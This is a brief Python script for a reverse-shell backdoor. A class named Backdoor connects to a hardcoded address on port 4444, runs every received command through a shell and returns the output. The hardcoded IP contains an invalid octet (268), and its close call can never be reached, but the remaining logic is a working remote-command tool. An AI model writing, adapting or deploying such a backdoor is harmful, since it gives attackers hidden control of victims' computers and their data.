import socket, subprocess

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def execute_system_commands(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            command = self.connection.recv(1024)
            command_result = self.execute_system_commands(command.decode())
            self.connection.send(command_result)
        self.connection.close()
        

my_Backdoor = Backdoor("192.268.29.75", 4444)
my_Backdoor.run()